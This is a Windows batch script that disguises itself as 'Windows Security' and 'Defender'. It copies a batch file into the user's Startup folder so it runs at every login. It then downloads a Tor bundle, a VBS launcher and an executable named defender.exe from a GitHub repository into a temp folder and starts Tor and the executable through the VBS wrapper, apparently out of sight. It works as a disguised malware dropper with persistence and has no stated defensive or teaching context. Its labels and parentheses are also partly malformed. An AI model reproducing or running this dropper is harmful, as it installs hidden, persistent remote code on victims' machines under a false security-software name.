@echo off
IF not exist  "%temp%\defender\" ( mkdir "%temp%\Defender\" )
IF not exist  "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Security.bat" (
:check
ping -n 1 www.google.com | findstr TTL || goto check
ping -n 1 www.google.com | findstr TTL && set c=1
curl -L https://github.com/proogram/Windows-Security/raw/master/Windows-Security/Windows%20Security.bat -o "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Security.bat"
)
:check
ping -n 1 www.google.com | findstr TTL || goto check
ping -n 1 www.google.com | findstr TTL && set c=1
curl -L https://github.com/proogram/Windows-Security/raw/master/Windows-Security/tor.CAB -o "%temp%\defender\tor.CAB"
Expand "%temp%\defender\tor.cab" -F:* "%temp%\defender"
del /f "%temp%\defender\tor.CAB"
)
IF not exist  "%temp%\defender\service.vbs" (
:check
ping -n 1 www.google.com | findstr TTL || goto check
ping -n 1 www.google.com | findstr TTL && set c=1
curl -L https://github.com/proogram/Windows-Security/raw/master/Windows-Security/service.vbs -o "%temp%\defender\service.vbs"
)
IF not exist  "%temp%\defender\defender.exe" (
:check
ping -n 1 www.google.com | findstr TTL || goto check
ping -n 1 www.google.com | findstr TTL && set c=1
curl -L https://github.com/proogram/Windows-Security/raw/master/Windows-Security/defender.exe -o "%temp%\defender\defender.exe"
)
"%temp%\defender\service.vbs" "%temp%\defender\tor.exe"
"%temp%\defender\service.vbs" "%temp%\defender\defender.exe"